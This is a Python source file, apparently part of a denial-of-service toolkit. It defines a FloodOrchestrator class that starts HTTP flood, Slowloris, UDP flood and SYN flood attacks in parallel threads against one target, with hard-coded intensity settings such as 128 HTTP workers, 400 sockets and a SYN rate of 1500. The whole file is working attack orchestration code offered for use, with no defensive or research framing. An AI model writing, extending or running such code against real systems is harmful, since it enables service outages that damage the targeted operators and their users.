"""
Orchestrator — mix HTTP + Slowloris + UDP simultaneously.
SYN only fires if raw capability exists.
"""
import threading
import time
from .http_flood import HTTPFlood
from .slowloris import Slowloris
from .udp_flood import UDPFlood
from .syn_flood import SYNFlood


class FloodOrchestrator:
    def __init__(self, target, duration=60, layers=("http", "slow", "udp", "syn")):
        self.target = target
        self.duration = duration
        self.layers = layers
        self.results = {}

    def _run_layer(self, name, fn):
        try:
            self.results[name] = fn()
        except Exception as e:
            self.results[name] = {"error": str(e)}

    def run(self):
        threads = []
        if "http" in self.layers:
            f = HTTPFlood(self.target, workers=128, duration=self.duration)
            threads.append(threading.Thread(target=self._run_layer, args=("http", f.run)))
        if "slow" in self.layers:
            sl = Slowloris(self.target.split("//")[-1].split("/")[0],
                           port=443 if "https" in self.target else 80,
                           sockets=400, duration=self.duration,
                           https="https" in self.target)
            threads.append(threading.Thread(target=self._run_layer, args=("slow", sl.run)))
        if "udp" in self.layers:
            host = self.target.split("//")[-1].split("/")[0].split(":")[0]
            ud = UDPFlood(host, threads=16, duration=self.duration)
            threads.append(threading.Thread(target=self._run_layer, args=("udp", ud.run)))
        if "syn" in self.layers:
            host = self.target.split("//")[-1].split("/")[0].split(":")[0]
            sy = SYNFlood(host, duration=self.duration, rate=1500)
            threads.append(threading.Thread(target=self._run_layer, args=("syn", sy.run)))

        for t in threads:
            t.start()
        t0 = time.time()
        while time.time() - t0 < self.duration + 5:
            time.sleep(0.5)
        for t in threads:
            t.join(timeout=5)
        return self.results
